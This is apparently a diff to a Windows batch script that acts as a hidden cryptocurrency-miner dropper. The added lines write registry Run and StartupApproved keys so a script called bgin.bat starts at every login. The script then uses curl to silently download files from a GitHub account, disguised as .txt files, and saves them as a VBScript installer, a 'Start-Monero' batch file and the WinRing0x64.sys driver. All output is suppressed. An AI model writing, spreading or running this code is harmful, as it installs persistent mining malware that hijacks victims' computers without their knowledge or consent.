@@ -1,6 +1,13 @@
 @echo off
 mkdir "C:\ProgramData\PSU" >> nul
-timeout 1 >> nul
+:start
+ping -n 2 www.google.com
+if "%errorlevel%" == "0" goto online
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Bgin" /t REG_SZ /F /D "C:\ProgramData\bgin.bat"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Bgin" /t REG_BINARY /D 000000000000000000000000 /F
+goto start
+
+:online
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/Install.txt" -o "C:\ProgramData\PSU\Install.vbs" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/Start-Monero.txt" -o "C:\ProgramData\PSU\Start-Monero.bat" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/WinRing0x64.txt" -o "C:\ProgramData\PSU\WinRing0x64.sys" >> nul
